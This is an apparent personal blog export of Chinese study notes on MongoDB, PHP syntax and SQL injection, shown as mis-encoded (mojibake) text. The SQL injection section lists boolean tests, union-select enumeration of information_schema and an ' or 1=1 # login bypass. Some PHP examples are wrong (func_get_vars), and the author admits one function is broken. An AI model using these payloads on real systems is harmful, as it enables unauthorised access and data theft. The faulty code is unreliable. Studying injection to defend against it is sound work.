<p>MongoDBçš„å‰¯æœ¬é›†ä¸æˆ‘ä»¬å¸¸è§çš„ä¸»ä»æœ‰æ‰€ä¸åŒï¼Œä¸»ä»åœ¨ä¸»æœºå®•æœºåæ‰€æœ‰æœåŠ¡å°†åœæ­¢ï¼Œè€Œå‰¯æœ¬é›†åœ¨ä¸»æœºå®•æœºåï¼Œå‰¯æœ¬ä¼šæ¥ç®¡ä¸»èŠ‚ç‚¹æˆä¸ºä¸»èŠ‚ç‚¹ï¼Œä¸ä¼šå‡ºç°å®•æœºçš„æƒ…å†µã€‚</p>
<h1 id="å¤‡ä»½æ•°æ®"><a href="#å¤‡ä»½æ•°æ®" class="headerlink" title="å¤‡ä»½æ•°æ®"></a>å¤‡ä»½æ•°æ®</h1><p>mongodump -h dbhost -d dbname -o backupdirectory</p>
<h1 id="æ¢å¤æ•°æ®"><a href="#æ¢å¤æ•°æ®" class="headerlink" title="æ¢å¤æ•°æ®"></a>æ¢å¤æ•°æ®</h1><p>mongorestore -h hostname:port -d dbname backup_data_path</p>
<p>æŸ¥çœ‹mongodbè¿è¡ŒçŠ¶æ€</p>
<p>åœ¨å‘½ä»¤è¡Œè¾“å…¥mongostat</p>
<p>æŸ¥çœ‹mongodbé›†åˆçš„è¯»å†™è€—æ—¶</p>
<p>åœ¨å‘½ä»¤è¡Œè¾“å…¥mongotop</p>
<h1 id="MongoDBå…³ç³»"><a href="#MongoDBå…³ç³»" class="headerlink" title="MongoDBå…³ç³»"></a>MongoDBå…³ç³»</h1><p>ongoDB çš„å…³ç³»è¡¨ç¤ºå¤šä¸ªæ–‡æ¡£ä¹‹é—´åœ¨é€»è¾‘ä¸Šçš„ç›¸äº’è”ç³»ã€‚</p>
<p>æ–‡æ¡£é—´å¯ä»¥é€šè¿‡åµŒå…¥å’Œå¼•ç”¨æ¥å»ºç«‹è”ç³»ã€‚</p>
<p>MongoDB ä¸­çš„å…³ç³»å¯ä»¥æ˜¯ï¼š</p>
<ul>
<li>1:1 (1å¯¹1)</li>
<li>1: N (1å¯¹å¤š)</li>
<li>N: 1 (å¤šå¯¹1)</li>
<li>N: N (å¤šå¯¹å¤š)</li>
</ul>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥è€ƒè™‘ä¸‹ç”¨æˆ·ä¸ç”¨æˆ·åœ°å€çš„å…³ç³»ã€‚</p>
<p>ä¸€ä¸ªç”¨æˆ·å¯ä»¥æœ‰å¤šä¸ªåœ°å€ï¼Œæ‰€ä»¥æ˜¯ä¸€å¯¹å¤šçš„å…³ç³»ã€‚</p>
<p>åµŒå…¥å¼å…³ç³»</p>
<p>å°†æ•°æ®ç›´æ¥åµŒå…¥åˆ°ä¸€ä¸ªåŸŸä¸­</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span>ObjectId(<span class="string">&quot;52ffc33cd85242f436000001&quot;</span>)<span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;contact&quot;</span><span class="punctuation">:</span> <span class="string">&quot;987654321&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;dob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;01-01-1991&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Tom Benzamin&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">         <span class="attr">&quot;building&quot;</span><span class="punctuation">:</span> <span class="string">&quot;22 A, Indiana Apt&quot;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="attr">&quot;pincode&quot;</span><span class="punctuation">:</span> <span class="number">123456</span><span class="punctuation">,</span></span><br><span class="line">         <span class="attr">&quot;city&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Los Angeles&quot;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="string">&quot;California&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">         <span class="attr">&quot;building&quot;</span><span class="punctuation">:</span> <span class="string">&quot;170 A, Acropolis Apt&quot;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="attr">&quot;pincode&quot;</span><span class="punctuation">:</span> <span class="number">456789</span><span class="punctuation">,</span></span><br><span class="line">         <span class="attr">&quot;city&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Chicago&quot;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Illinois&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢æ–¹æ³•ï¼šdb.users.findOne({â€œnameâ€:â€Tom Benzaminâ€},{â€œaddressâ€:1})</p>
<p>åº”ç”¨å¼å…³ç³»</p>
<p>å°†æ–‡æ¡£çš„objectidæµ…å…¥åˆ°åŸŸä¸­</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span>ObjectId(<span class="string">&quot;52ffc33cd85242f436000001&quot;</span>)<span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;contact&quot;</span><span class="punctuation">:</span> <span class="string">&quot;987654321&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;dob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;01-01-1991&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Tom Benzamin&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;address_ids&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      ObjectId(<span class="string">&quot;52ffc4a5d85242602e000000&quot;</span>)<span class="punctuation">,</span></span><br><span class="line">      ObjectId(<span class="string">&quot;52ffc4a5d85242602e000001&quot;</span>)</span><br><span class="line">   <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ç§æ–¹æ³•éœ€è¦ä¸¤æ¬¡æŸ¥è¯¢</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&gt;var result = db.users.findOne(<span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Tom Benzamin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;address_ids&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span>)</span><br><span class="line">&gt;var addresses = db.address.find(<span class="punctuation">&#123;</span><span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$in&quot;</span><span class="punctuation">:</span>result<span class="punctuation">[</span><span class="string">&quot;address_ids&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>Mongodb</tag>
        <tag>æ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPè¯­æ³•</title>
    <url>/archives/187503e5.html</url>
    <content><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h1 id="æµç¨‹ç»“æ„"><a href="#æµç¨‹ç»“æ„" class="headerlink" title="æµç¨‹ç»“æ„"></a>æµç¨‹ç»“æ„</h1><p><code>break 2</code>ï¼šåå¯æ¥æ•°å­—ï¼Œè¡¨ç¤ºè·³å‡ºå¾ªç¯çš„çº§æ•°ï¼›</p>
<h1 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h1><p><code>a and b</code>: å°†å¯èƒ½ä¸ºfalseçš„å€¼æ”¾åœ¨açš„ä½ç½®ï¼Œä»¥æé«˜ç¨‹åºçš„è¿è¡Œé€Ÿåº¦ï¼›</p>
<p><code>a or b</code> å°†å¯èƒ½ä¸ºtrueçš„å€¼æ”¾åœ¨açš„ä½ç½®</p>
<p>ä¾‹ï¼š<code>a or ++a</code> è‡ªå¢çš„è¿ç®—ç¬¦ä¼˜å…ˆçº§é«˜äº<code>or</code>,ä¸€èˆ¬è€ƒè™‘å½“aåˆå§‹å€¼ä¸º10 <code>a</code>ä¸º<code>true</code>çš„æƒ…å†µä¸‹ï¼Œåˆ™è¿ç®—åçš„ç»“æœaä¸º11ã€‚å®é™…ä¸Šåº”ä¸º<code>a</code>ä¸º<code>true,</code>ç³»ç»Ÿä¸å¯¹aè¿›è¡Œè‡ªå¢ï¼Œè€Œæ˜¯ä»¥ç»“æœä¸ºå¯¼å‘ï¼Œ<code>a</code>å¹¶ä¸ä¼šå‚åŠ è¿ç®—ï¼Œå®é™…ä¸Šè¿ç®—ç»“æŸåå…¶å€¼ä¸º10ã€‚</p>
<h1 id="HEREDOC"><a href="#HEREDOC" class="headerlink" title="HEREDOC"></a>HEREDOC</h1><p><img src="/archives/187503e5/Untitled.png"></p>
<h1 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h1><h1 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h1><h2 id="å±€éƒ¨å˜é‡"><a href="#å±€éƒ¨å˜é‡" class="headerlink" title="å±€éƒ¨å˜é‡"></a>å±€éƒ¨å˜é‡</h2><p>å®šä¹‰åœ¨å‡½æ•°å†…éƒ¨çš„å˜é‡ä¸ºå±€éƒ¨å˜é‡ï¼Œå±€éƒ¨å˜é‡ä¸èƒ½åœ¨å‡½æ•°å¤–éƒ¨è¢«è®¿é—®ï¼Œéšç€å‡½æ•°çš„ç»“æŸè€Œé”€æ¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$a</span>=<span class="number">4</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">//æ­£å¸¸</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">//æŠ¥é”™</span></span><br></pre></td></tr></table></figure>

<h2 id="é™æ€å˜é‡"><a href="#é™æ€å˜é‡" class="headerlink" title="é™æ€å˜é‡"></a>é™æ€å˜é‡</h2><p><code>static $a=1;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">static</span> <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$a</span>+=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>();<span class="comment">//$a==2</span></span><br><span class="line"><span class="title function_ invoke__">test</span>();<span class="comment">//$a==3</span></span><br></pre></td></tr></table></figure>

<p>é™æ€å˜é‡å†å‡½æ•°ç»“æŸæ‰§è¡Œåä»ä¸ä¼šç«‹å³é”€æ¯ï¼Œå†ä¸‹æ¬¡è°ƒç”¨è¯¥å‡½æ•°æ—¶é™æ€å˜é‡ä¸­å­˜å‚¨çš„å€¼ä»ç„¶æœ‰æ•ˆï¼Œä¸”é™æ€å˜é‡åªå†ç¬¬ä¸€æ¬¡æ‰§è¡Œæ—¶å£°æ˜ã€‚</p>
<h2 id="å…¨å±€å˜é‡"><a href="#å…¨å±€å˜é‡" class="headerlink" title="å…¨å±€å˜é‡"></a>å…¨å±€å˜é‡</h2><p>phpæ‰€æœ‰å¾—å…¨å±€å˜é‡éƒ½å­˜åœ¨ä¸ä¸€ä¸ªå«åš$GLOBALSçš„æ•°ç»„æ€»é€šè¿‡å˜é‡åå¯ä»¥è®¿é—®è¯¥å…¨å±€å˜é‡,è¦åœ¨å‡½æ•°ä¸­è®¿é—®å…¨å±€å˜é‡éœ€è¦ä½¿ç”¨globalå…³é”®å­—å£°æ˜ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">2</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>]=<span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>]+<span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span> <span class="variable">$y</span>;</span><br><span class="line"><span class="comment">#è¾“å‡ºç»“æœx=3,y=2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="å¸¸é‡"><a href="#å¸¸é‡" class="headerlink" title="å¸¸é‡"></a>å¸¸é‡</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SRATIC&quot;</span>,<span class="string">&quot;aramndhe&quot;</span>) <span class="comment">//å¸¸é‡å¤§å†™</span></span><br></pre></td></tr></table></figure>

<h2 id="é¢„å®šä¹‰å¸¸é‡"><a href="#é¢„å®šä¹‰å¸¸é‡" class="headerlink" title="é¢„å®šä¹‰å¸¸é‡"></a>é¢„å®šä¹‰å¸¸é‡</h2><p><a href="%E9%A2%84%E5%AE%9A%E4%B9%89%E5%B8%B8%E9%87%8F%20b5c740a209d14e979cad2094d1486ade.csv">é¢„å®šä¹‰å¸¸é‡</a></p>
<h1 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h1><h2 id="ä¼ å‚-åº”ç”¨ä¼ é€’ä¸å€¼ä¼ é€’"><a href="#ä¼ å‚-åº”ç”¨ä¼ é€’ä¸å€¼ä¼ é€’" class="headerlink" title="ä¼ å‚-åº”ç”¨ä¼ é€’ä¸å€¼ä¼ é€’"></a>ä¼ å‚-åº”ç”¨ä¼ é€’ä¸å€¼ä¼ é€’</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span>,&amp;<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$a</span>+=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$b</span>+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>,<span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>

<p>è¿ç®—ç»“æŸå<code>$a</code>çš„å€¼ä»ç„¶ä¸º10ï¼Œ<code>$b</code>çš„å€¼ä¸º11ã€‚è¿™å°±æ˜¯phpå‚æ•°ä¼ é€’çš„ä¸¤ç§ä¸åŒæ¨¡å¼ï¼Œ<code>$a</code>ä¸ºå€¼ä¼ é€’ï¼Œå†å‡½æ•°æ‰§è¡Œæ—¶ï¼Œå°†<code>$a</code>çš„å€¼å¤åˆ¶ä¸€ä»½åˆ°å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªæ–°å¾—å€¼ï¼Œæ­¤æ—¶å‡½æ•°ä¸­å¾—<code>$a</code>ç›¸å½“äºä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œå‚ä¸å‡½æ•°çš„è¿ç®—ï¼Œæ•…å‡½æ•°ä¸­çš„è¿ç®—å¹¶ä¸ä¼šå¯¹<code>$a</code>çš„åŸå§‹å€¼äº§ç”Ÿå½±å“ã€‚è€Œ<code>&amp;$b</code>åˆ™æŒ‡å¼•ç”¨ä¼ é€’ï¼Œå†è¿ç®—è¿‡ç¨‹ä¸­<code>$b</code>çš„ç›¸å½“äºå°†å…¶å†…å­˜åœ°å€ä¼ åˆ°äº†å‡½æ•°ä¸­ï¼Œæ­¤æ—¶<code>$a</code>ç›¸å½“äºå…¨å±€å˜é‡ï¼Œå‡½æ•°ä¸­å¯¹<code>$b</code>çš„æ”¹å˜ç›¸å½“äºå¯¹å…¶æœ¬èº«å€¼å¾—æ”¹å˜ã€‚</p>
<h2 id="ä¸å®šé•¿ä¼ å‚"><a href="#ä¸å®šé•¿ä¼ å‚" class="headerlink" title="ä¸å®šé•¿ä¼ å‚"></a>ä¸å®šé•¿ä¼ å‚</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">func_get_vars</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="number">12</span>,<span class="number">45</span>,<span class="number">565</span>);</span><br></pre></td></tr></table></figure>

<p><code>func_get_vars,</code>è¿ç®—ç»“æŸåå°†ç­”åº”è¾“å…¥çš„æ‰€æœ‰å®å‚çš„å€¼ï¼Œç”¨ä»¥å®ç°å‡½æ•°çš„ä¸å®šé•¿å‚æ•°ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">func_get_var</span>(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="number">12</span>,<span class="number">45</span>,<span class="number">565</span>);</span><br></pre></td></tr></table></figure>

<p><code>func_get_var</code>å‡½æ•°ä¸­ä¼ å…¥å½¢å‚çš„ç´¢å¼•ç¼–å·ï¼Œè·å–å¯¹åº”ç´¢å¼•çš„å€¼ã€‚ä¸Šä¾‹å°†ä¼šæ‰“å°12ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">func_num_args</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="number">12</span>,<span class="number">45</span>,<span class="number">565</span>);</span><br></pre></td></tr></table></figure>

<p><code>func_num_args</code> ï¼Œè·å–è‡ªå®šä¹‰å‡½æ•°ä¼ å…¥å‚æ•°çš„æ•°é‡ã€‚</p>
<h2 id="å¯å˜å‡½æ•°"><a href="#å¯å˜å‡½æ•°" class="headerlink" title="å¯å˜å‡½æ•°"></a>å¯å˜å‡½æ•°</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">func_num_args</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="number">132</span>,<span class="number">56</span>,<span class="number">64</span>);</span><br></pre></td></tr></table></figure>

<p>å¯å˜å‡½æ•°ï¼Œå°†å‡½æ•°ä½œä¸ºä¸€ä¸ªå¯¹è±¡èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ã€‚</p>
<h2 id="é€’å½’å‡½æ•°"><a href="#é€’å½’å‡½æ•°" class="headerlink" title="é€’å½’å‡½æ•°"></a>é€’å½’å‡½æ•°</h2><p>å‡½æ•°å†…éƒ¨è‡ªå·±è°ƒç”¨è‡ªå·±çš„å‡½æ•°è¢«ç§°ä¸ºé€’å½’å‡½æ•°ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">avc</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$n</span>.<span class="string">&#x27;&amp;nbsp&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$n</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">avc</span>(<span class="variable">$n</span>-<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;---&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$n</span>.<span class="string">&#x27;&amp;nbsp&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">avc</span>(<span class="number">3</span>);    <span class="comment">////////è¿™ä¸ªå‡½æ•°å†™é”™äº†ï¼Œæˆ‘åœ¨è¿™å„¿å†™è’™äº†....................</span></span><br></pre></td></tr></table></figure>

<h1 id="ç±»å‹æ¯”è¾ƒ"><a href="#ç±»å‹æ¯”è¾ƒ" class="headerlink" title="ç±»å‹æ¯”è¾ƒ"></a>ç±»å‹æ¯”è¾ƒ</h1><p><img src="/archives/187503e5/1791863413-572055b100304_articlex.png"></p>
<p><img src="/archives/187503e5/xxxxphp.png"></p>
<h1 id="æ•°ç»„å‡½æ•°"><a href="#æ•°ç»„å‡½æ•°" class="headerlink" title="æ•°ç»„å‡½æ•°"></a>æ•°ç»„å‡½æ•°</h1><p><a href="%E6%95%B0%E7%BB%84%E5%87%BD%E6%95%B0%20c36bc961c2234b2f9955d25ff9d1f75a.csv">æ•°ç»„å‡½æ•°</a></p>
<h1 id="å­—ç¬¦ä¸²å‡½æ•°"><a href="#å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²å‡½æ•°"></a>å­—ç¬¦ä¸²å‡½æ•°</h1><p><a href="%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%209e0dd38fb42c476fa07841c726018d3b.csv">å­—ç¬¦ä¸²å‡½æ•°</a></p>
<h1 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h1><p><a href="%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%203ac58c6683e840f8b798762884e03849.csv">æ­£åˆ™è¡¨è¾¾å¼</a></p>
<h1 id="æ—¥æœŸä¸æ—¶é—´"><a href="#æ—¥æœŸä¸æ—¶é—´" class="headerlink" title="æ—¥æœŸä¸æ—¶é—´"></a>æ—¥æœŸä¸æ—¶é—´</h1><p><a href="%E6%97%A5%E6%9C%9F%E4%B8%8E%E6%97%B6%E9%97%B4%20009dab6678b843d795c58fd0d31ab451.csv">æ—¥æœŸä¸æ—¶é—´</a></p>
<h1 id="å›¾åƒå¤„ç†"><a href="#å›¾åƒå¤„ç†" class="headerlink" title="å›¾åƒå¤„ç†"></a>å›¾åƒå¤„ç†</h1><p><a href="%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%204a40796073364bba815921092123718f.csv">å›¾åƒå¤„ç†</a></p>
<h1 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h1><p><a href="%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%206c84a88d190340f7a6d6b7376b749978.csv">æ–‡ä»¶æ“ä½œ</a></p>
<h1 id="ä¸Šä¼ æ–‡ä»¶"><a href="#ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶"></a>ä¸Šä¼ æ–‡ä»¶</h1><p><a href="%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%20ae156639101b4f0da055f9cd7d43d828.csv">ä¸Šä¼ æ–‡ä»¶</a></p>
<h1 id="ä¸‹è½½æ–‡ä»¶"><a href="#ä¸‹è½½æ–‡ä»¶" class="headerlink" title="ä¸‹è½½æ–‡ä»¶"></a>ä¸‹è½½æ–‡ä»¶</h1><p><a href="%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%20f402da2166bc4961bc505e65204939d5.csv">ä¸‹è½½æ–‡ä»¶</a></p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>ç¼–ç¨‹è¯­è¨€</category>
      </categories>
      <tags>
        <tag>PHPè¯­æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLæ³¨å…¥</title>
    <url>/archives/e73517db.html</url>
    <content><![CDATA[<h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><h1 id="æ³¨å…¥ç‚¹åˆ¤æ–­"><a href="#æ³¨å…¥ç‚¹åˆ¤æ–­" class="headerlink" title="æ³¨å…¥ç‚¹åˆ¤æ–­"></a>æ³¨å…¥ç‚¹åˆ¤æ–­</h1><h2 id="æ•°å­—æ³¨å…¥"><a href="#æ•°å­—æ³¨å…¥" class="headerlink" title="æ•°å­—æ³¨å…¥"></a>æ•°å­—æ³¨å…¥</h2><p><strong>æŸ¥è¯¢è¯­å¥</strong>ï¼šselect * from table where id&#x3D;1</p>
<p><strong>æ„é€ è¯­å¥</strong>ï¼š</p>
<p>select * from table where id&#x3D;1 and 1&#x3D;1 &#x2F;&#x2F;ä¸æŠ¥é”™</p>
<p>select * from table where id&#x3D;1 and 1&#x3D;2 &#x2F;&#x2F;æŠ¥é”™ï¼Œåˆ™å­˜åœ¨æ³¨å…¥æ¼æ´</p>
<h2 id="å­—ç¬¦æ³¨å…¥"><a href="#å­—ç¬¦æ³¨å…¥" class="headerlink" title="å­—ç¬¦æ³¨å…¥"></a>å­—ç¬¦æ³¨å…¥</h2><p><strong>æŸ¥è¯¢è¯­å¥</strong>ï¼šselect * from table where id&#x3D;â€˜1â€™</p>
<p><strong>æ„é€ è¯­å¥</strong>ï¼š</p>
<p>select * from table where id&#x3D;â€˜1â€™ and â€˜1â€™&#x3D;â€˜1â€™ &#x2F;&#x2F;ä¸æŠ¥é”™</p>
<p>select * from table where id&#x3D;â€˜1â€™ and â€˜1â€™&#x3D;â€˜2â€™ &#x2F;&#x2F;æŠ¥é”™ï¼Œåˆ™å­˜åœ¨æ³¨å…¥æ¼æ´</p>
<h2 id="åŠ æ³•å’Œå‡æ³•"><a href="#åŠ æ³•å’Œå‡æ³•" class="headerlink" title="åŠ æ³•å’Œå‡æ³•"></a>åŠ æ³•å’Œå‡æ³•</h2><p>select * from table where id &#x3D;1%2b1 &#x2F;&#x2F;+æœ‰ç‰¹æ®Šå«ä¹‰æ•…éœ€ä½¿ç”¨urlç¼–ç </p>
<p>select * from table where id &#x3D;3-1</p>
<h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><h2 id="æ„é€ è”åˆæŸ¥è¯¢"><a href="#æ„é€ è”åˆæŸ¥è¯¢" class="headerlink" title="æ„é€ è”åˆæŸ¥è¯¢"></a>æ„é€ è”åˆæŸ¥è¯¢</h2><p>select * from table where id&#x3D;â€˜1â€™ union order by 2 #â€™ &#x2F;&#x2F;æµ‹è¯•å‘½ä»¤çš„æŸ¥è¯¢å­—æ®µæ•°é‡</p>
<p>select * from table where id&#x3D;â€˜1â€™ union select 1,(group_concat(concat(å­—æ®µ1ï¼Œå­—æ®µ2ï¼Œâ€¦))) from information_schema.schemata <a href="//group_contact">&#x2F;&#x2F;group_concat</a> æ˜¾ç¤ºæ‰€æœ‰è¡Œï¼Œconcatåˆå¹¶æ˜¾ç¤ºé€‰æ‹©å­—æ®µ</p>
<h2 id="ä¸‡èƒ½å¯†ç "><a href="#ä¸‡èƒ½å¯†ç " class="headerlink" title="ä¸‡èƒ½å¯†ç "></a>ä¸‡èƒ½å¯†ç </h2><p>select * from table where name&#x3D;<em>nameandpassword</em>&#x3D;password</p>
<p>åˆ©ç”¨ï¼šä»»æ„è¾“å…¥ â€˜ or 1&#x3D;1 # &#x2F;&#x2F;å¯åŒæ—¶ç»•è¿‡ç”¨æˆ·ååŠå¯†ç </p>
